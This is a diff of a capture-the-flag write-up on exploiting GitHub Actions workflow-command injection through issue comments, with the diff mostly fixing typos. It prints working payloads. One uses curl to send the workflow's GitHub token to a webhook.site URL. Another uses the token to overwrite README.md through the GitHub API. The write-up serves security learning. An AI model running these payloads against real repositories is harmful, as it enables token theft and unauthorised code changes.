@@ -52,7 +52,7 @@ jobs:
           result-encoding: string
 ```
 
-As it was my first time working with GitHub workflow, I needed to understand how GitHub workflow works. I googled the workflow syntax for github actions to understand the workflow configuration. 
+As it was my first time working with GitHub workflow, I needed to understand how GitHub workflow works. I googled the workflow syntax for github actions to understand the workflow configuration.
 
 Link: https://docs.github.com/en/actions/reference/workflow-syntax-for-github-actions
 
@@ -60,11 +60,11 @@ After reading the syntax, I realised this this workflow will the process describ
 
 ![new-issue](./new-issue.jpeg)
 
-Then I proceed to make a new commnet under the newly created issue, "test issue". I noticed that an action was ran after my comment, so I clicked on the action and tried to see the log.
+Then I proceed to make a new comment under the newly created issue, "test issue". I noticed that an action was ran after my comment, so I clicked on the action and tried to see the log.
 
 ![github-action-log](./github-action-log.jpeg)
 
-So I realised that my comment is a user input that I can control, which may or may not be the vulnerability. As this is my only lead, I went ahead and googled more GitHub actions workflow releated stuff, and I came across a GitHub Security Lab blog post about untrusted input.
+So I realised that my comment is a user input that I can control, which may or may not be the vulnerability. As this is my only lead, I went ahead and googled more GitHub actions workflow related stuff, and I came across a GitHub Security Lab blog post about untrusted input.
 
 Link: https://securitylab.github.com/research/github-actions-untrusted-input
 
@@ -87,27 +87,27 @@ with:
     result-encoding: string
 ```
 
-Looking at the workflow file again, I see that my input (*comment_body*), is flows to `console.log(process.env.COMMENT_BODY)`. My first initial thought is that I could potential inject javascript code here. To test my theory, I tried inputing quotes, `'` and `"` to see if there is any error generated. 
+Looking at the workflow file again, I see that my input (_comment\_body_), is flows to `console.log(process.env.COMMENT_BODY)`. My first initial thought is that I could potential inject javascript code here. To test my theory, I tried inputting quotes, `'` and `"` to see if there is any error generated.
 
 And did it work? Of course that didn't work, it would have been too easy if it did. Afterwards, I thought to try out some of the steps written in the GitHub Security Lab blog post about untrusted input. I tried template injection, but that didn't work as there is no template here.
 
-Sadly, I was stuck here for a long time, just spamming and hoping for an error to pop out. I decided to continue googling GitHub actions/workflow, to see if I could find anything of interest. 
+Sadly, I was stuck here for a long time, just spamming and hoping for an error to pop out. I decided to continue googling GitHub actions/workflow, to see if I could find anything of interest.
 
 Which somehow, I did. I found out that there is something called "workflow command", not sure what that is, I read the website and noticed that a workflow command was passed in a `console.log`. I tried doing the same thing just to see what will happen.
 
 Link: https://docs.github.com/en/actions/reference/workflow-commands-for-github-actions
 
-My input: `::save-state name=processID::12345`. This workflow command create environment variables named STATE_processID with the value of 12345. I thought that this command could modify the COMMAND_ID, so I replace "processID" with "COMMAND_ID". Spoiler alert, it didn't. Why not? That's because this command created an enviroment variable and prepend "STATE_".
+My input: `::save-state name=processID::12345`. This workflow command create environment variables named STATE\_processID with the value of 12345. I thought that this command could modify the COMMENT\_ID, so I replace "processID" with "COMMENT\_ID". Spoiler alert, it didn't. Why not? That's because this command created an environment variable and prepend "STATE\_".
 
 ```yaml
 if: ${{ steps.comment_log.outputs.COMMENT_ID }}
 ```
 
-Back to the workflow file again, I noticed that if I wanted the next step to run, the commet_log needed to output the COMMENT_ID, right? Note: *Not really, `steps.comment_log.outputs.COMMENT_ID` is actually just the value of the output from the comment_log step.*
+Back to the workflow file again, I noticed that if I wanted the next step to run, the comment*log needed to output the COMMENT\_ID, right? Note: \_Not really, `steps.comment_log.outputs.COMMENT_ID` is actually just the value of the output from the comment\_log step.*
 
-With that, I'm going to skip my painstaking redundant effort to try to get "COMMNET_BODY" to be the value of "COMMENT_ID".
+With that, I'm going to skip my painstaking redundant effort to try to get "COMMENT\_BODY" to be the value of "COMMENT\_ID".
 
-Now, another workflow command is `::set-output name=action_fruit::strawberry`. This workflow command set the value output of "action_fruit" to "strawberry". Understanding this command, I tried to set the output value of commnet_log, "COMMNET_ID" to "true" after learning that expression in the `if` statement will be evaluated as an expression. 
+Now, another workflow command is `::set-output name=action_fruit::strawberry`. This workflow command set the value output of "action\_fruit" to "strawberry". Understanding this command, I tried to set the output value of comment\_log, "COMMENT\_ID" to "true" after learning that expression in the `if` statement will be evaluated as an expression.
 
 My input: `::set-output name=COMMENT_ID::true`. Finally, I started to see progress. Quickly, I know that command injection is possible, as this input is treated as an expression as part of the variable declaration.
 
@@ -117,19 +117,21 @@ const id = ${{ steps.comment_log.outputs.COMMENT_ID }}
 
 ![github-action-log-process](./github-action-log-process.jpeg)
 
-Time to print out the enviroment variables, which contains the GITHUB TOKEN for READ/WRITE access according to the GitHub workflow documentation. My input: `::set-output name=COMMENT_ID::true ;console.log(process.env);`.
+Time to print out the environment variables, which contains the GITHUB TOKEN for READ/WRITE access according to the GitHub workflow documentation. My input: `::set-output name=COMMENT_ID::true ;console.log(process.env);`.
 
 ![github-action-leak-env](github-action-leak-env.png)
 
 However, the GitHub token is masked, therefore we cannot just see it. Also, later on, I would realised the the token is only valid while the action is being run. Therefore, even if I could copy and token, it would be useless later.
 
-I then used some website to recieve request, thinking that I could append the token as part of the URL, just to validate the token exists. My input: `::set-output name=COMMENT_ID::true ;const execSync = require('child_process').execSync; code = execSync('curl https://webhook.site/REDACTED?token=' + process.env["INPUT_GITHUB-TOKEN"]);`. I did the same for "ACTIONS_RUNTIME_TOKEN".
+I then used some website to receive request, thinking that I could append the token as part of the URL, just to validate the token exists. My input: `::set-output name=COMMENT_ID::true ;const execSync = require('child_process').execSync; code = execSync('curl https://webhook.site/REDACTED?token=' + process.env["INPUT_GITHUB-TOKEN"]);`. I did the same for "ACTIONS\_RUNTIME\_TOKEN".
 
 After verifying that the token exists, all I had to do is to make a request using GitHub API with the token to commit to the "README.md" file. I spent quite a few time researching the API but the solution is below.
 
 ## My Solution
 
-``::set-output name=COMMENT_ID::true ;const execSync = require('child_process').execSync; code = execSync(`curl -i --request PUT --url https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}/contents/README.md --header 'authorization: Bearer ${process.env["INPUT_GITHUB-TOKEN"]}' --header 'content-type: application/json' --data '{ "message": "PWNED!!!!", "content": "V2UgYXJlIGluY3JlZGlibHkgc2VjdXJlISBCdXQgaWYgeW91IGRpc2FncmVlLCBwbGVhc2UgZmlsZSBhIFBSIDopCk5PUEUsIEkgRElTQUdSRUVFRSEh", "sha": "959c46eb0fbab9ab5b5bfb279ab6d70f720d1207" }' --fail`);``
+```javascript
+::set-output name=COMMENT_ID::true ;const execSync = require('child_process').execSync; code = execSync(`curl -i --request PUT --url https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}/contents/README.md --header 'authorization: Bearer ${process.env["INPUT_GITHUB-TOKEN"]}' --header 'content-type: application/json' --data '{ "message": "PWNED!!!!", "content": "V2UgYXJlIGluY3JlZGlibHkgc2VjdXJlISBCdXQgaWYgeW91IGRpc2FncmVlLCBwbGVhc2UgZmlsZSBhIFBSIDopCk5PUEUsIEkgRElTQUdSRUVFRSEh", "sha": "959c46eb0fbab9ab5b5bfb279ab6d70f720d1207" }' --fail`);
+```
 
 ![pwned](./pwned.jpeg)
 
@@ -137,4 +139,4 @@ After verifying that the token exists, all I had to do is to make a request usin
 
 GitHub Capture the Flag results: https://github.blog/2021-03-22-github-ctf-results/
 
-Note: *The results website shows a different step taken to solve this challenge, go ahead and read it as I think it's nicer and cleaner solution overall compared to mine.*
+Note: _The results website shows a different step taken to solve this challenge, go ahead and read it as I think it's nicer and cleaner solution overall compared to mine._
